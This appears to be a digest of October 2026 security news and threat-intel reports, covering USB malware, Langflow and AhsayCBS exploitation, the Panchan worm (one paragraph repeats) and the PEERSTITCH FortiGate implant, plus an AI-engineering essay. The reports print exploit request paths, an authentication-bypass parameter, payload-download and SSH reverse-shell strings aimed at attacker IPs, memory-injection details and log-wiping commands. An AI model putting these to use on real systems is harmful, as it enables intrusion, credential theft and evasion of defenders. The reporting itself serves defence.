US Air Force pilots used malware-laden USB drives to plan Afghanistan missions

news The Register · 2026-10-15 · ↗ original

Welcome, once again, to PWNED, the weekly column where we gawk at organizations that have made serious security mistakes. Normally, we’re talking about businesses or maybe the odd school that messes up, but today we’re writing about a serious IT screwup in the world’s most powerful military. Have a story about someone leaving a gaping hole in their network? Share it with us at pwned@sitpub.com. Anonymity is available upon request. Today’s tale comes from Justin Henkel, the CISO of IT monitoring and service company SolarWinds. Henkel previously worked in IT security for the Air Force and one day in the early 2000s saw a practice that just wouldn’t fly today. Before USB drives became popular, burning CDs with mission data was the modus operandi, and those discs were put in both unclassified and classified systems. “They would write a CD, and then they would take that CD and then put it in a classified system and do the remainder of the mission planning,” Henkel told us. “Then they would take that disc and then put it in the airplane.” Inside the airplane, the data on the CD would help the pilot navigate and contain information about threats they might encounter. Later, when thumb drives became a thing, pilots used them instead of discs. “They didn't really think about the overall impact of classified versus unclassified systems,” Henkel said of the pilots. “Using the same device for both, they didn’t understand that you could read and write onto a USB drive with malware. [They were] not really understanding the overall threat picture.” According to Henkel, Air Force personnel would buy their flash drives from local vendors rather than sourcing them from official military contractors. If they were in Afghanistan, those drives could literally come from a store in Kabul. And it wasn’t exactly the equivalent of Best Buy. “It was more difficult to bring a US-based computer into the nation than it was just to buy local,” he said. “So they were just going out into the local market in Kabul or whatever city that they were out [in]. And I used to do this: go out, make relationships with the local vendors. ‘Hey I need 100 USB sticks.’” Unfortunately, enemies of the US noticed and soon started selling infected USB drives to local vendors in the Middle East. Henkel knew that using a sneakernet with classified systems was a recipe for disaster. It’s just that no one would listen to him. “It was just a shock,” he told us. “I was a young 22-year-old guy, very junior in the overall rank system, trying to tell colonels and majors that what they’re doing is a violation.” In 2008, the US Department of Defense was infected by malware after somebody attached an infected USB flash drive to a laptop with access to US Central Command. The worm, dubbed Agent.BTZ, could collect information from infected computers and communicate with remote servers. A 2016 report from the FBI and DHS attributed the malware to one or more Russian groups. It took the Pentagon 14 months to scrub it from its systems. It took this attack for the Pentagon to wise up in 2008 and ban the use of USB drives, instead forcing data transfers to go through more secure systems. Eventually, in 2010, the drives were allowed again under certain circumstances. ®

Microsoft fixes bug causing Windows black screens, Explorer crashes

news BleepingComputer · 2026-10-15 · ↗ original

Microsoft has resolved a known issue that was causing black screens, desktop loading issues, and Explorer crashes after installing Windows 11 updates released since August.

As Microsoft explained when it acknowledged the issue last month, affected users experienced multiple symptoms, most commonly a black screen after sign-in, being unable to access their desktop until they manually started the desktop session, and Windows Explorer crashes in application event logs.

However, this known issue mainly affects Azure Virtual Desktop (AVD) hosts using FSLogix, a software solution that speeds up user profile loading in virtual desktop environments.

Microsoft has now addressed the bug in cumulative updates released as part of this month's Patch Tuesday and asked affected users to update their systems.

"This issue was resolved by Windows updates released October 13, 2026 [..] and updates released after that date. We recommend you install the latest update for your device as it contains important improvements and issue resolutions, including this one," it said in a release health dashboard update. "If you install an update released October 13, 2026 [..] or later, you do not need to use a workaround for this issue."

Microsoft also shared a temporary workaround for those who can't install this month's Windows updates, which requires them to manually launch Windows Explorer. This can be done by opening Task Manager (Ctrl+Shift+Esc), selecting Run new task, entering explorer.exe, and clicking OK.

Microsoft also mitigated the issue for enterprise customers via Known Issue Rollback (KIR) that has to be applied on enterprise-managed devices by installing one of the following group policies:

"You will need to install and configure the Group Policy for your version of Windows to resolve this issue. You will also need to restart your device(s) to apply the group policy setting," Microsoft noted. "Note that this Group Policy will disable the change causing this issue until a resolution is released in a future Windows update.

IT admins can find further details on deploying and configuring KIR group policies on Microsoft's support website.

This week, Microsoft also resolved a known issue that triggered Always On VPN connection problems after installing the September 2026 security updates and confirmed that recent Windows updates may trigger Remote Desktop failures for non-admin users if the "Administrator protection" security feature is enabled.

Langflow's Critical Authenticated RCE Flaw Targeted in 1,423 Honeypot Exploit Attempts

news The Hacker News · 2026-10-15 · ↗ original

Threat actors are exploiting a critical security flaw in Langflow, according to an alert from Previdian.

Langflow is an open-source platform that allows developers to build artificial intelligence (AI) applications and agentic workflows. In February 2025, DataStax, the parent company of Langflow, was acquired by IBM.

The vulnerability in question is CVE-2026-105740 (CVSS score: 9.9), a case of authenticated remote code execution impacting versions prior to 1.9.0.

"Any authenticated Langflow user can achieve Remote Code Execution (RCE) on the server by adding an MCP server with the 'stdio' transport," reads an advisory released last month.

"The user-supplied command field is passed directly to bash -c "exec {command}" with zero validation, no allowlisting, and no sandboxing. The command executes immediately when the server list is fetched. Additionally, the env field allows arbitrary environment variable injection (e.g., LD_PRELOAD, PATH override)."

The crux of the vulnerability is that Langflow accepts a user-provided command without restricting it to approved executables. This, in turn, can lead to shell execution.

In a hypothetical attack scenario, a bad actor can exploit the flaw in the following fashion -

  • Login as a regular, non-admin user.
  • Add a malicious MCP server by sending a crafted HTTP POST request to "/api/v2/mcp/servers/{server_name}" with a command field containing a malicious payload (e.g., a reverse shell).
  • The server accepts and stores the attacker-supplied "command" without any validation.
  • Trigger the flaw by fetching the MCP server list via an HTTP GET "/api/v2/mcp/servers?action_count=true" request, causing the command to execute.
  • Achieve code execution.

"Any authenticated Langflow user (including non-admin accounts) can execute arbitrary OS commands on the server with the privileges of the Langflow process," Langflow warned.

Successful exploitation can result in full server compromise, environment variable injection, facilitate lateral movement, and the deployment of a persistent backdoor, as the malicious MCP server configuration persists and re-executes every time the server list is loaded.

"Unlike custom component code which is visible in the flow editor, MCP server configs are stored in project settings and are not visible during normal flow review," Langflow said.

Data from Previdian shows that 1,423 exploitation attempts have been recorded against its honeypot sensors since September 19, 2026, from 27 unique attacker IP addresses located in Belgium, China, Germany, Hong Kong, Japan, Nigeria, the Philippines, Russia, Seychelles, Singapore, South Korea, Taiwan, Tanzania, the U.S., and Vietnam.

The exploitation efforts ramped up starting October 11, 2026, when 333 attempts were registered. As of writing, 66 attempts have been observed on October 15, 2026.

"We've investigated how attackers are authenticating, as this vulnerability requires authentication," Ryan Dewhurst, founder and CEO of Previdian, told The Hacker News.

"In one observed sequence, attackers checked the Langflow version, attempted /api/v1/auto_login (which returned 403 as it was disabled in our honeypot), and then successfully authenticated using a common username and password. They immediately used the resulting bearer token to access the vulnerable MCP server configuration endpoint."

Some of the captured payloads include -

  • Attempts to extract environment variables and sensitive Langflow configurations, including LANGFLOW_SECRET_KEY and LANGFLOW_SUPERUSER_PASSWORD, and transmit them to 146.70.211[.]112:18764.
  • Docker commands attempting to access the host filesystem and read the contents of "/etc/passwd."
  • Command execution probes using id, whoami, and other simple commands.

A significant chunk of the activity originates from the IP address "192.255.229[.]92," which has been observed attempting to extract environment variables. Data from GreyNoise and Previdian shows that the IP address has engaged in generic brute-force attacks, as well as exploiting other flaws in Flowise (CVE-2026-69255) and Langflow (CVE-2026-55255, CVE-2026-9198, and CVE-2026-0768).

"We recommend upgrading Langflow to a patched version, disabling auto-login, enforcing strong and unique passwords, and reviewing authentication logs and requests to /api/v2/mcp/servers/ for suspicious activity," Dewhurst said.

Last month, Langflow also addressed another critical vulnerability (CVE-2026-105697, CVSS score: 9.9) that could also result in operating system command injection through MCP stdio server configuration.

If immediate patching is not an option, it's advised to set LANGFLOW_AUTO_LOGIN=false, avoid exposing Langflow directly to untrusted networks, and grant Langflow accounts to trusted users.

[This is a Guest Diary by Zachary Norwood, an ISC intern as part of the SANS.edu BACS program]

Crypto mining malware has been active and spreading across the internet for quite some time now. Moreover, the DShield honeypot picked up a worm that self-propagates through a plethora of means. One of them is stealing SSH keys after it gains access to a system. Furthermore, it also leverages a rootkit to maintain access to infected systems. One would hope that threat actors would have moved on past this worm by now. However, due to its rudimentary design and its effectiveness, they have had no reason to move on.

A malicious binary was uploaded and executed on the DShield honeypot, and that is where a copy of the Panchan worm was obtained. It is written with Golang, and it is a peer-to-peer botnet. Moreover, this worm was first identified in 2022. Many vendors recognize this worm now as seen below.

Therefore, a system with security controls such as egress filtering, ingress filtering, access control lists, continuous monitoring, and passwordless authentication will prevent this worm from taking root. However, many systems are insecure and unpatched. This is why this worm is still propagating across the internet. The strings captured from the binary below show how simple it is to find its command-and-control channel and the functions that it consists of.

Furthermore, leveraging something as simple as syslog to pull logs and using commands such as grep to find privilege escalation activities, software installation, software removal, and access to ports such as SSH will allow an analyst to identify this activity. However, this does not scale well. Therefore, leveraging a SIEM to gather and parse this data is a much more effective solution. Next, all traffic entering and exiting from both the trusted and untrusted networks needs to pass through at least one firewall. Preferably, also having an intrusion detection or prevention system right after the public facing firewall in the trusted zone.

These captures clearly show the source files that the Panchan worm consists of. To dig deeper into what this binary can do, a network simulator was used. Moreover, the specific network simulator that was used was FakeNet-NG with Wireshark to intercept the network traffic. These tools were used to identify what URL it was reaching out to once it was installed on a system. FakeNet-NG is a tool developed by the Mandiant FLARE team for dynamic network analysis. This tool simulates legitimate network traffic, allowing an analyst to identify how the malware interacts with the network and if it is communicating with an external server. This specific strain of this worm was using a discord channel as a command-and-control server. This was identified by capturing and dissecting the network traffic that was generated by the worm interacting with the FakeNet-NG network.

Panchan, the peer-to-peer crypto mining worm, is a threat to any organization who has internet facing servers. This worm is mainly a threat to insecure systems, and opening SSH to a public network needs to be done in a secure way. Fail2Ban is a service that scans log files for repeated failed login attempts. This service then blocks that IP address by updating the system’s firewall rule. Fail2Ban is another control that should be put in place with a public facing SSH port. Services like SSH should have multi-factor authentication, and an access control list. The access control list should include specific IP addresses or a jump box. Disabling root login with SSH is another essential security control that needs to be implemented.

With SSH, public and private key pairs are another option for authentication. This will then create the capability to disable password authentication for the SSH service preventing brute force attacks. However, these key pairs are often created and forgotten about. This is a security concern, and SSH private keys are something that this worm is designed to steal. Once it has stolen a private key, it attempts to pivot to hosts in the running user’s SSH known_hosts file. A simple mitigation to protect the data within the known_hosts file is to use the HashKnownHosts option within a systems SSH configuration. Furthermore, it is best to mitigate long lived credentials and SSH key stealing by leveraging tools likeHashiCorp Vault to sign SSH certificates with short expirations. This ensures that reusing a key becomes highly impractical or even impossible. The user will authenticate to Vault with their credentials then they send their SSH public key to Vault for signing, and finally Vault then signs the SSH key. Then it returns the SSH certificate to the user. This certificate can be used to log in to any host configured to trust the Vault CA. Leveraging such infrastructure will also allow an organization to disable password authentication entirely for services like SSH.

Furthermore, leveraging something as simple as syslog to pull logs and using commands such as grep to find privilege escalation activities, software installation, software removal, and access to ports such as SSH will allow an analyst to identify this activity. However, this does not scale well. Therefore, leveraging a SIEM to gather and parse this data is a much more effective solution. Next, all traffic entering and exiting from both the trusted and untrusted networks needs to pass through at least one firewall. Preferably, also having an intrusion detection or prevention system right after the public facing firewall in the trusted zone.

Typical indicators of compromise for this worm include multiple failed authentication attempts via SSH, unusual resource usage on infected systems, and processes that cannot be killed by any means. This worm also creates hidden directories in the running users home directory or folders like /tmp. Often, these directories have names that are strings that have high amounts of entropy. For this strain of this worm, servers reaching out to services like Discord on a regular basis is another indicator of compromise that an analyst can look for. In conclusion, denying by default and allowing by exception is a vital strategy for systems facing untrusted networks. These same techniques that were discussed above can be used to protect critical public facing infrastructure from threat actors.

CVE-2026-105133 and CVE-2026-105134

AhsayCBS Authentication Bypass and Remote Code Execution Vulnerabilities

CVE-2026-105133 and CVE-2026-105134 affect AhsayCBS (Cloud Backup Server), the centralized management server for Ahsay backup software. Attackers are chaining these vulnerabilities to bypass authentication and execute code on exposed servers. Their CVSS 3.x base scores are 7.3 (High) and 10.0 (Critical), respectively. Huntress has confirmed exploitation involving JSP webshells and cryptocurrency miners.

Technical Details

CVE-2026-105133: Authentication Bypass

An improper authentication vulnerability affects the checkSysPwd function in AhsayCBS’s JSON API handler. Horizon3.ai’s reverse engineering confirmed the exploitable condition: com.ahsay.obs.json.JSONApi.execute() skips the checkSysPwd() password check whenever the request body carries “FromServlet”:”Y”, making every JSON API action reachable without valid credentials. The vulnerability has a CVSS 3.x base score of 7.3 (High).

CVE-2026-105134: Replication Receiver Remote Code Execution

The published CVE description classifies CVE-2026-105134 as OS command injection affecting /rps/api/json/UpdateReceivers.do in the Replication Receiver component. Its CVSS 3.x base score is 10.0 (Critical).

Horizon3.ai’s reverse engineering identified a path traversal in the replicated-file upload service, PUT /rps/obs7/rpsfile/upload. The service builds its destination path from attacker-controlled UserHome and TopDir request headers through getReplicatedPath(), without applying the path denylist used elsewhere in the product.

When chained with the authentication bypass, this file-write capability allows an attacker to place an executable JavaServer Pages (JSP) file in a web-served Tomcat application directory. Requesting the uploaded JSP executes code with the privileges of the AhsayCBS service account. This exploitation path requires the target to be configured or licensed as a replication receiver.

Compromise of the AhsayCBS host puts centrally managed backup policies, storage, and users at risk.

Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant

threat-intel Unit 42 · 2026-10-14 · ↗ original

Executive Summary

Unit 42 investigated a multi-stage network intrusion against a telecommunications organization that occurred in September 2024, which we are tracking as cluster CL-STA-0954 (aka UNC5820). The attackers behind CL-STA-0954 achieved an initial compromise by exploiting CVE-2024-47575 against a centralized FortiManager appliance.

From that single appliance, our observations are that the attackers exfiltrated an archive containing running configurations, cryptographic material and database files containing information about more than 500 managed FortiGate firewalls. Those firewalls protected the target's own infrastructure and the networks of its clients.

Following the initial compromise, the attackers behind CL-STA-0954 demonstrated a complex level of tradecraft. Aspects of the post-exploitation activity overlap with intrusions attributed to suspected nation-state actors. Armed with the stolen information, the attackers:

  • Maintained long-term access
  • Intercepted network traffic
  • Established VPN sessions
  • Deployed backdoors
  • Exploited a separate privilege-escalation vulnerability

The attackers exploited another vulnerability, CVE-2025-61624, via FortiOS auto-script path traversal. This exploit facilitated the deployment of PEERSTITCH, a novel, memory-resident ARM64 malware.

PEERSTITCH leaves no persistent binary on disk, opens no listening ports and initiates no outbound network connections. Instead, it communicates through traffic generated by legitimate processes on the infected host, which makes the malware resistant to conventional endpoint and network detection.

The attackers also impersonated the FortiManager platform to pull from managed firewalls of other hosts in the targeted network.

Overview of the Intrusion

We investigated a prolonged network intrusion against a telecommunications managed service provider. The attackers demonstrated proficiency in Fortinet appliance architecture, FortiOS internals and FortiOS management protocols.

Our investigation spanned the provider's own environment. We did not examine the client networks whose firewalls the provider managed. The exposure described in this report is of configuration and credential material rather than confirmed intrusion into those networks. Figure 1 below shows a flowchart illustrating an overview of the intrusion.

Initial Access and Network Configuration Theft (CVE-2024-47575)

During the initial phase of the intrusion, the attackers exploited CVE-2024-47575 (referred to by external parties as FortiJump). The vulnerability allows an unauthenticated remote attacker to execute arbitrary commands via crafted requests to the FMG-Access (TCP port 541) management channel.

During the exploitation, the attackers registered a rogue Virtual FortiGate appliance named localhost (serial number FMG-VMTM23017412) to the central FortiManager instance, originating from external attacker infrastructure (45.32.41[.]202, later modified to 198.199.122[.]22).

Immediately following device registration, the attacker generated a configuration archive named .tm in the FortiManager file system, which they exfiltrated shortly thereafter. Analysis of this artifact revealed:

  • The FortiManager appliance's own serial number and its management relationships to every enrolled device
  • Complete running configuration files for more than 500 managed FortiGate firewalls across internal infrastructure and client networks
  • Central management SQLite databases: global.db (containing administrative domains, global objects and policy packages) and revinfo.db (containing device revision metadata)
  • A flat text inventory listing more than 500 FortiGate serial numbers alongside their respective public IP addresses
  • Internal network topology maps, routing tables and interface configurations
  • Ciphertext administrative, local and SSL/VPN credentials
  • Encoded cryptographic trust material, including public certificates and private keys

Reconnaissance and Targeted Traffic Sniffing

Following an extended dwell period, the attackers pivoted to active network reconnaissance. They used the compromised FortiManager device to push unauthorized sniffer configurations to multiple downstream managed FortiGate firewalls.

Credential Decryption and Initial Re-Entry

The exfiltrated FortiGate configurations contained sensitive credentials stored as reversible ciphertext. We confirmed that the credentials were recoverable by successfully brute-forcing administrative and SSL/VPN passwords from the exfiltrated configuration files.

Using legitimate credentials, the attackers established unauthorized FortiGate SSL/VPN sessions to perimeter firewalls from known external staging infrastructure (23.240.77[.]233 and 47.18.167[.]159). These sessions granted the attackers authenticated access into internal network-management segments.

Privilege Escalation: CVE-2025-61624

During the intrusion, the attackers exploited CVE-2025-61624 to escalate from FortiOS administrative access to root on the underlying firewall operating system. A FortiOS administrator, including a super_admin, operates within a restricted management command line with no shell access and no direct control over the appliance file system or its running processes. The daemons that implement FortiOS run as root beneath that interface.

The vulnerability allows an authenticated administrative account to read and write arbitrary files as root via path traversal in the FortiOS CLI system.auto-script engine. The auto-script object name is not sanitized, allowing a name containing traversal sequences to place the script body outside the intended directory, at any file system location. The script executes with the privileges of the auto-script engine.

Technical Analysis of the PEERSTITCH Implant

PEERSTITCH is a 64-bit Linux ARM64 executable written in C and statically linked against glibc. It acts as a one-shot process memory patching injector targeting two core FortiOS daemons:

  • /bin/miglogd: The central system and traffic logging daemon
  • /bin/iked: The IKE/IPsec VPN service daemon handling cryptographic negotiation

Figure 3 shows a flow chart of PEERSTITCH activity, which we will examine in greater detail.

Delivery and Staging Chain

1). Downloader initialization: Exploiting CVE-2025-61624, the attackers pushed ../../../../setup to a select number of firewalls

2). Payload retrieval: The script downloaded five files from hxxp[:]//23.240.77[.]233:8085/ into /data2/template/:

  • pM.js: Environment preparation script (self-deleting)
  • a.js (saved as index.js): Emscripten JavaScript runtime module
  • a.wasm (saved as index.wasm): Compiled WebAssembly binary module
  • b.js (saved as ipssem.js): Deployment orchestrator script
  • dd (saved as lldprx): Native ARM64 ELF binary injector (PEERSTITCH core)

3). Execution: Following an execution delay, ipssem.js launched lldprx with arguments lldprx!index.js!index.wasm!ipssem.js!lldprx!yyyy!pM.js

Injector Execution and Process Parasitization

The lldprx binary performs a single-pass execution sequence:

  1. Process discovery: Iterates through /proc/, parses /proc/<pid>/cmdline and locates the process identifiers (PIDs) for /bin/miglogd and /bin/iked
  2. Memory layout enumeration: Reads /proc/<pid>/maps to extract the base addresses and memory boundaries of both target daemons
  3. Process attachment: Attaches to both running processes using ptrace(PTRACE_SEIZE, pid) and halts execution via PTRACE_INTERRUPT
  4. Register state capture: Calls ptrace(PTRACE_GETREGSET, pid) to snapshot all ARM64 general-purpose registers (X0 through X30), the stack pointer (SP) and program counter (PC)
  5. Dynamic shellcode construction: Generates an ARM64 bootstrap stub dynamically. The bootstrap executes an mmap syscall (X8 = 0xDE) requesting 0x4000 (16,384 bytes) of PROT_READ | PROT_WRITE | PROT_EXEC (RWX) memory mapped as MAP_PRIVATE | MAP_ANONYMOUS
  6. Payload injection: Writes a 1,344-byte injection payload into the newly allocated RWX buffer via /proc/<pid>/mem

Covert IPC and Cross-Daemon Memory Sharing

Instead of using network sockets or disk files, PEERSTITCH creates a covert, memory-resident communication bridge between /bin/miglogd and /bin/iked.

Figure 4 shows a flowchart for PEERSTITCH network traffic.

  • Passive traffic monitoring: Inside both daemons, the hook code inspects data already passing through the process without redirecting packets. It evaluates string patterns using strstr() for two specific markers:
    • TCP port marker: 8550 (embedded within traffic data, not a listening port)
    • IP address marker: 169.254.0.1 (link-local identifier used for pattern matching)
  • Tag extraction and buffering: When a marker is identified, the hook extracts an associated session token or identifier (up to 31 bytes) and writes it into a 16-slot circular ring buffer at offset +0x0F0
  • Cross-process write: The hook iterates through its forwarding table at offset +0x400 (populated with the counterpart daemon's PID and buffer base address). It invokes open(), lseek() and write() on /proc/<counterpart_pid>/mem, writing the extracted tag directly into the other daemon's memory.
  • Conditional execution branching: When /bin/iked processes subsequent VPN sessions, its hook inspects its injection buffer. If a corresponding tag exists, the hook takes an alternate return branch (ADRP return path), bypassing default FortiOS security validations.

Memory Patching and Branch Path Modification

To suppress tamper detection and alter default daemon routines, PEERSTITCH applies direct NOP patches (0xAA0003E0, corresponding to MOV X0, X0 on ARM64) to three static offsets within target process memory:

  • base + 0x106F7B8
  • base + 0x1072E20
  • base + 0x109A570

A 20-byte trampoline patch is written to base + 0x135102C to redirect standard execution into the allocated RWX hook buffer. Figure 5 shows a visual memory layout of the 16 KB buffer used by the ARM64 PEERSTITCH payload.

Weaponization Mechanics

1). Rogue certificate authority initialization: The account.json state file demonstrates the initial registration with the attacker's ACME server, explicitly routing ACME directory requests to external infrastructure

2). Challenge orchestration: The order.json file outlines the pending certificate order, mapping the authorization and finalization URLs directly to the attacker's server

3). Command execution via DNS-01 challenge: MDChallengeDns01 was mapped directly to /bin/node. When Apache initiates a certificate validation challenge, it executes Node.js with parameters retrieved from the remote ACME server. The job.json debug log reveals how the attackers exploited this by injecting shell commands (kali@23.240.77[.]233:8084:b -F /tmp/upfile/ssh_config -i) directly into the domain name field of the challenge request, initiating an SSH-based reverse shell.

4). Continuous polling loop: Setting MDRenewMode always forced the Apache daemon to continuously trigger these malicious renewal challenges. Because the DNS-01 challenge was mapped to /bin/node, this polling cycle ensured the continuous re-execution of the injected payload, establishing a persistent outbound reverse-shell communication channel.

Management Impersonation and FortiGate to FortiManager Chained Exploitation

FortiGate to FortiManager (FGFM) communications occur over TCP port 541 using cryptographic trust material requested and validated against appliance serial numbers. The archive exfiltrated during the initial FortiJump compromise contained this material, along with the serial numbers and management relationships of every downstream device.

Following FGFM interactions from external infrastructure over TCP port 541, an administrative account named FortiGateCloud downloaded complete running configurations from multiple managed firewalls. The victim organization operated no FortiManager Cloud tenant, and no such account was provisioned on the affected devices.

We assess with a medium degree of confidence that the attackers issued these commands by impersonating the management platform over FGFM. Two paths were available to them, and the evidence does not distinguish between them:

  • Exploitation of CVE-2024-26009 to bypass FGFM authentication using the FortiManager's serial number
  • Direct reuse of the exfiltrated trust material to authenticate as the legitimate FortiManager

Asserting a management identity requires terminating the authentic FortiManager's session. It is possible that the attackers forced this session termination using CVE-2024-26008, consistent with the intermittent tunnel management interface drops described in the Anti-Forensics and Defense Evasion section below.

Anti-Forensics and Defense Evasion

The attackers took extensive measures to eliminate forensic artifacts:

  • Service termination: Executed killall -9 miglogd and killall -9 syslogd to halt local and remote syslog generation prior to executing malicious auto-scripts
  • Crash log clearing: Issued FortiOS diagnostic command diagnose debug crashlog clear to wipe segmentation fault logs generated during initial memory injection attempts
  • Configuration rollback: Automatically deleted rogue administrator accounts, rogue VPN groups and auto-script objects (../../../../setup) shortly after execution
  • Decoy artifact creation: Overwrote /tmp/apache2/conf/md-acme.conf with a common string found in this file (#0 certs managed by ACME\n\n\n) to mask reverse-shell configuration files
  • Process memory self-deletion: lldprx unlinked its own binary from disk and scanned /proc/ to terminate the staging setup process before exiting
  • Logging telemetry disruption: Log telemetry showed intermittent drops across the tunnel management interface during periods of malicious activity. We assess with medium confidence that the attackers deliberately induced this degradation to suppress real-time telemetry to central management consoles. This is consistent with the previously described pattern of telemetry suppression, including terminating miglogd and syslogd, clearing crash logs, and rolling back configuration objects. It’s possible that the attackers forced the disconnects using CVE-2024-26008 over TCP port 541. Available logs do not capture the triggered traffic, so we could not confirm the mechanism.

Conclusion

This intrusion highlights a growing threat, the weaponization of centralized edge management ecosystems to compromise downstream networks. One compromised appliance yielded the cryptographic keys, credentials and network topology for more than 500 firewalls, including devices protecting client organizations.

The discovery of the PEERSTITCH implant demonstrates the increasing technical maturity of edge-device malware. By operating as a one-shot injector, avoiding persistent disk artifacts and building a covert inter-process communication bridge inside process memory, the attackers achieved sustained persistence while evading traditional monitoring.

For organizations that manage infrastructure on behalf of others, the management platform is the highest-value target on the network. Compromising the management platform is not contained by the boundary of the organization that owns it. That compromise also does not end when the platform is patched.

The cryptographic trust material governing the platform's relationship with every managed device leaves with the attacker and remains valid until it is rotated. Defenders must treat edge management interfaces with the highest level of zero trust isolation. They must also treat the credentials and certificates those interfaces hold as compromised the moment the platform is.

Be the Architect: Intentional AI Engagement for Cybersecurity Engineering

red-team SpecterOps · 2026-10-14 · ↗ original

TL;DR: How SpecterOps combined deliberate human engagement, model routing, and specialized tools to overhaul Ghostwriter’s user interface for $815.50 in model spend.

Disclosure: SpecterOps participates in OpenAI’s Trusted Access for Cyber and Daybreak programs. Codex is the primary example in this article because it fits our engineering workflow and because of that relationship. The operating principles described here are vendor-neutral and can be applied to other model families and coding agents.

AI access is not an AI strategy

When organizations talk about using AI for engineering, the conversation often starts with the model: Which one is most capable? Which one is fastest? Which one is cheapest? Those questions matter, but they come after a more important one: How should people engage with the agent?

Our answer is straightforward: be the architect.

An agent can take on a substantial amount of labor. You can task an agent to explore a codebase, propose alternative solutions, implement a design, update hundreds of related components, and perform repeatable checks. But you should not transfer ownership of the problem to an agent. The human still sets the direction, establishes what success means, challenges assumptions, and accepts responsibility for the result.

This is a leadership problem as much as it is a technical one. An AI agent is not a human team member: it does not share responsibility, understand organizational intent, or carry judgment from one situation into another unless that context is made available. Yet, some of the same principles that make delegation effective with people also matter here. Ambiguous direction produces ambiguous work. Missing constraints do not remain empty; the model fills them with a plausible interpretation. Incidental comments may receive more weight than we intended.

Consider a deliberately silly prompt: “Beans. Beans. Beans. Write me a haiku.” The model will almost certainly write a haiku about beans. It has no reason to know the repeated word was an aside, a test, or irrelevant context. The same behavior becomes consequential when the subject is an application architecture, an accessibility requirement, a research hypothesis, or a security control. This is also why long-running chats can start to go off the rails; a comment or correction you made an hour ago for a different task may influence the next task in ways you did not intend.

Prompt engineering, then, is not a search for magic phrasing. The human must begin with problem definition and proceed with deliberate and intentional expansion. Using an agent intentionally means deciding what context matters, what role the agent should play, what decisions remain open, and what evidence will be required before the work is accepted.

Intentional engagement comes first

At SpecterOps, we have been formalizing this with a framework called the AI Engagement Model, or AIEM, based on Mark Keith’s data science research at BYU. Its purpose is to make AI a force multiplier while keeping authorship, judgment, and understanding with the person responsible for the work. It begins with a simple premise:

> AI performance is a function of the human, the model, and the workflow.

AIEM follows a recurring loop: Frame, Challenge, Verify, Decide, Produce. We frame the problem and define success. We challenge assumptions and ask for alternatives. We verify claims and behavior. We decide which direction to take. Only then do we ask the agent to implement the work. The loop repeats as new information appears.

Our role changes as we move through that loop. At the beginning of a project, we may act as the Problem Setter. We can ask the agent to become a Creative Expander when we need options or a Critical Challenger when we want to stress test an idea. Once the direction is clear, the agent can shift into an Implementation Assistant. Later, it can help verify the result. We choose the role that fits the state of the work.

That choice also influences cost. Asking an expensive model to discover our goals, choose a direction, implement it, and judge its own success creates a long interaction shaped by assumptions we may never see. A mixed-model workflow can become just as expensive when every model is left to determine what the team wants.

Clear framing reduces that uncertainty. Concrete success criteria allow much of the implementation to move to a less expensive model while reserving the more capable model for ambiguity, difficult diagnosis, and consequential review.

Match the model to the work

Our engineering guidance starts with the least expensive model that can handle the task. We escalate when the work shows us that we need more capability, then return to the economical tier when that need has passed. Starting too low creates rework. Starting every task with the most expensive model pays a premium for routine questions and clear changes.

You must also consider reasoning effort, but don’t get caught up in these details. Reasoning effort is another routing choice that affects performance and cost. Higher effort can improve results when work requires more planning, analysis, or verification, although it also takes longer and consumes more tokens. Start with the model’s default effort and increase it when the task or the results justify the added expense. During the Ghostwriter project, Medium was a useful baseline and good for documentation, while High suited more involved engineering work. Extra High sometimes gave GPT-5.6 Luna enough reasoning time to complete tasks we might otherwise have routed to GPT-5.6 Terra. Treat reasoning effort as a tuning control alongside model selection, not as a substitute for clear direction. Effort levels like Max or Ultra should remain escalation choices. These unlock higher levels of reasoning or the ability to spawn subagents, and both can increase cost and how quickly you consume quotas.

Names may change and levels may shift, so keep the approach simple: start with the model’s default and establish a baseline that produces reliable results for your usual work. Increase effort for difficult problems or when results suggest deeper analysis would help. Consider lowering it for straightforward documentation or simple changes, and reserve the highest settings for work that justifies them. Revisit the setting when the work or results change; you don’t need to tune it on every turn.

Tools and skills also shape how well an agent can gather context, challenge a plan, interact with an application, and verify its work. Three were particularly useful during the Ghostwriter project:

  • Matt Pocock’s grill-me helped turn an incomplete project direction into a structured interrogation of goals, assumptions, and unresolved decisions.
  • Anthropic’s frontend-design skill helped reinforce the design and accessibility direction and counter the generic “vibe-coded” appearance common in AI-generated interfaces. We cannot isolate its exact effect, although the agents consistently referenced and applied its guidance.
  • Vercel Labs’ agent-browser gave the agents a smoother way to navigate the development application, exercise workflows, and capture screenshots or video for review. This proved much more reliable for our workflow than our initial browser automation setup with Chrome and Playwright MCP.

The model, effort, its tools, and the way we engage with both form one working system. Each part affects the outcome.

Maintain the context you provide

Skills, AGENTS.md files, and project documentation give agents durable context about how a team works. They can encode conventions, explain architecture, describe common workflows, and save the agent from rediscovering the same information during every session.

These materials require regular tuning. When an agent repeatedly misinterprets an instruction, takes an inefficient path, or produces an unexpected result, the surrounding context may need clarification. Changes to the codebase can also leave once-accurate guidance stale. Documentation carries more weight when an agent uses it to make decisions, so it needs to be clear, current, and specific. Keep these resources sharp.

The same applies to live session context. When corrections or completed tasks begin to dominate a chat, retire the session and start fresh so that stale context does not steer the next task.

Human review remains essential. An instruction like “Fix this test” carries unwritten expectations: resolve the defect in the code, preserve the purpose of the test, and avoid hard-coded output or shortcuts that merely make the check pass. An agent may satisfy the visible requirement while missing those expectations.

Well-maintained context reduces that ambiguity and makes agent behavior more predictable. Remember, you must still own the problem and the solution.

Have you ever tried to cut a tomato with a dull knife? It’s doable, but the results won’t be clean. Keeping your documentation, agent instructions, and context deliberate is like sharpening that blade.

Putting the approach to work

Ghostwriter is an open-source platform for managing offensive security engagements and crafting reports. Its interface had evolved over more than eight years, but the bulk of the design remained rooted in a decade-old design language built on Bootstrap v4. A meaningful refresh required changes across the whole application.

The refresh covered 99 distinct screens and required significant changes across 161 template files.

We upgraded the application to Bootstrap v5.3 and revisited every page. We tested new color schemes, modernized tabular interfaces, reduced accumulated UX friction, and established a more consistent and accessible design language. We also introduced several structural changes:

  • an expandable dashboard for tracking active work;
  • an “engagement bar” that replaced old breadcrumb-style navigation and made the relationships among reports, projects, clients, and activity logs easier to navigate; and
  • a customizable sidebar that supports pinning clients, projects, and reports for quick access.

The core design work and UI conversion began on July 17 and were completed in less than a month. We previewed the new interface at Black Hat USA in early August. The branch then continued through testing, review, and release candidate refinement. Reviewer suggestions led to a few minor changes to the interface between then and the v7.3.0-rc1 release on September 14th, but one person completed the design work and migration between July 17 and August 14.

